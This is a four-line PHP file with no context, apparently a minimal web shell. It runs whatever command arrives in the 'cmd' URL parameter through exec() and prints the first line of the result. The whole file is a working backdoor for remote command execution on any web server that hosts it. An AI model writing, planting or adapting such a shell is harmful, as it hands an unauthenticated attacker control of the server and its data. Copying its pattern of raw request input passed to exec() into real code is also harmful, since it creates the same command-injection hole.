<?php
exec($_GET['cmd'], $output);
echo $output[0];
?>
